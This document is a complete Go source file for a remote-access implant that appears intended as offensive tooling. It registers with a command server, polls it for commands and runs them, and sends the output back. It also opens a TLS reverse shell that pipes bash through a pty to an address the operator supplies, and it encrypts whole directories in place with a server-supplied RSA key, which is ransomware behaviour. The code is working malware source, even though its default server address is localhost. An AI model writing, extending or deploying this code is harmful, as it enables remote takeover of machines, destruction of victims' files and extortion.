package main

import (
    "fmt"
    "os"
    "os/exec"
    "io"
    "io/fs"
    "io/ioutil"
    "path/filepath"
    "net/http"
    "net/url"
    "strings"
    "strconv"
    "time"
    "encoding/pem"
    "crypto/tls"
    "crypto/x509"
    "crypto/sha256"
    "crypto/rsa"
    "crypto/rand"
    "github.com/creack/pty"
    "github.com/wolfeidau/golang-self-signed-tls"
)

// Settings
const remoteAddr = "127.0.0.1:8443"
const namePath = "/tmp/.name"

var includeFiletypes = []string{}
var agentName string

// Helper method for making http requests
func request(method string, url string, data url.Values) (*http.Response, error) {
	var req *http.Request
	var reqErr error

	tlsConfig := &http.Transport {
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client:= &http.Client{Transport: tlsConfig}

	if method == "GET" {
		req, reqErr = http.NewRequest("GET", url, nil)
	} else {
		req, reqErr = http.NewRequest("POST", url, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if reqErr != nil {
		return nil, reqErr
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return resp, nil
}

// Retrives the public key to use during encryption routines
func getKeyBlock() (*rsa.PublicKey, error) {
	resp, err := request("GET", "https://" + remoteAddr + "/pubkey", nil)
	if err != nil {
		return nil, err
	}

	respBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

    keyBlock, _ := pem.Decode(respBytes)

    keyValue, err := x509.ParsePKIXPublicKey(keyBlock.Bytes)
    if err != nil {
        return nil, err
    }

    return keyValue.(*rsa.PublicKey), nil

}

// Encrypts blocks of bytes with pubkey
func encrypt(plainBytes []byte, key *rsa.PublicKey) ([]byte, error) {
	var cipherBytes []byte
	hash := sha256.New()
	msgLen := len(plainBytes)
	step := key.Size() - 2*hash.Size() - 2

	for start := 0; start < msgLen; start += step {
		finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

        newCipherBytes , err := rsa.EncryptOAEP(hash, rand.Reader, key, plainBytes[start:finish], nil)
        if err != nil {
            return nil, err
        }

        cipherBytes = append(cipherBytes, newCipherBytes...)
    }

    return cipherBytes, nil
}

// Wraper method for encrypt()
func encryptFile(path string, key *rsa.PublicKey) error {
    plainBytes, err := os.ReadFile(path)
    if err != nil {
        return err
    }

    cipherBytes, err := encrypt(plainBytes, key)
    if err != nil {
        return err
    }

    info, err := os.Stat(path)
    if err != nil {
        return err
    }

    err = os.WriteFile(path, cipherBytes, info.Mode())
    if err != nil {
        return err
    }
    return nil
}

// Wraper method for encryptFile()
func encryptDirectory(targetPath string, extensions []string, key *rsa.PublicKey) ([]string, error) {
	paths := make([]string, 0)
    err := filepath.Walk(targetPath, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
        if !info.IsDir() {
            if len(extensions) != 0 {
                splitFileName := strings.Split(info.Name(), ".")
                if contains(extensions, splitFileName[len(splitFileName) - 1]) {
                    err := encryptFile(path, key)
                    if err != nil {
                        return err
                    }
					paths = append(paths, path)
                }
            } else {
                err := encryptFile(path, key)
                if err != nil {
                    return err
                }
				paths = append(paths, path)
            }
        }
		return nil
    })
	if err != nil {
		return nil, err
	}
	return paths, nil
}

// Helper method for checkiing file extensions
func contains(extensions []string, target string) bool {
    for _, extension := range extensions {
        if extension == target {
            return true
        }
    }
    return false
}

// Invokes a reverse shell
func reverseShell(address string, port int) error {

	result, err := selfsigned.GenerateCert(
			selfsigned.Hosts([]string{"127.0.0.1", "localhost"}),
			selfsigned.RSABits(4096),
			selfsigned.ValidFor(365*24*time.Hour),
	)

	cert, err := tls.X509KeyPair(result.PublicCert, result.PrivateKey)
	if err != nil {
			return err
	}

    config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

    conn, _ := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), &config)

    commandObj := exec.Command("bash")
    f, err := pty.Start(commandObj)
	if err != nil {
		return err
	}

    go func() {
        _, _ = io.Copy(f, conn)
    } ()


    _, _ = io.Copy(conn, f)

    f.Close()
	return nil
}

// Retrieves instructions from remote server
func getCommand() (string, error) {
	resp, err := request("GET", "https://" + remoteAddr + "/" + agentName + "/getCommand", nil)
    if (err != nil) {
        return "", err
    }

    body, err := ioutil.ReadAll(resp.Body)
    if (err != nil) {
        return "", err
    }

    if (string(body) == "") {
        return "", err
    }

    return string(body), nil
}

// Runs a command
func runCommand(command string) (string, error) {
    commandArgs := strings.Split(command[:len(command)], " ")
    commandObj := exec.Command(commandArgs[0], commandArgs[1:]...)
    byteOutput, err := commandObj.Output()

    if (err != nil) {
        return "", nil
    }

    return string(byteOutput), nil
}

// Returns output to remote server
func returnOutput(output string) {
    data := url.Values{"output": {output}}
	request("POST", "https://" + remoteAddr + "/" + agentName + "/returnOutput", data)
}

// Returns an error to remote server
func returnError(err string) {
    data := url.Values{"error": {err}}
	request("POST", "https://" + remoteAddr + "/" + agentName + "/returnError", data)
}

// Registers itself or loads the agent name from filesystem
func getName(remoteAddr string) (string, error) {

    if _, err := os.Stat(namePath); err == nil {
        content, err := ioutil.ReadFile(namePath)
        if (err != nil) {
            return "", err
        }
        return string(content), nil
    }

    for {
		resp, err := request("GET", "https://" + remoteAddr + "/register", nil)
		if (err != nil) {
			return "", err
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}

		ioutil.WriteFile(namePath, body, 0600)
		return string(body), nil
    }
}


func main() {
    var command string
	var nameErr error
	var cmdErr error

    agentName, nameErr = getName(remoteAddr)
	if nameErr != nil {
		returnError(nameErr.Error())
	}


	command, cmdErr = getCommand()
	if (cmdErr != nil || len(command) == 0) {
		return
	}

	if (len(command) > 7 && command[:7] == "REVERSE") {
		remoteAddrInfo := strings.Split(command[8:], ":")
		if len(remoteAddrInfo) != 2 {
			returnError("Invalid syntax for REVERSE")
			return
		}

		address := remoteAddrInfo[0]
		port, err := strconv.Atoi(remoteAddrInfo[1])
		if err != nil {
			returnError(err.Error())
			return
		}

		err = reverseShell(address, port)
		if err != nil {
			returnError("unable to invoke reverse shell: " + err.Error())
		}
	} else if (len(command) > 7 && command[:7] == "ENCRYPT") {
		directories := strings.Split(command[8:], ":")

		key, err := getKeyBlock()
		if err != nil {
			returnError("Unable to get public key")
		}

		for _, directory := range directories {
			paths, err := encryptDirectory(directory, includeFiletypes, key)
			if err != nil {
				returnError(err.Error())
			} else {
				returnOutput(strings.Join(paths, " "))
			}
		}
	} else {
		output, err := runCommand(command)
		if (err != nil) {
			returnError("unable to run command: " + err.Error())
			return
		}

		returnOutput(output)
	}
}
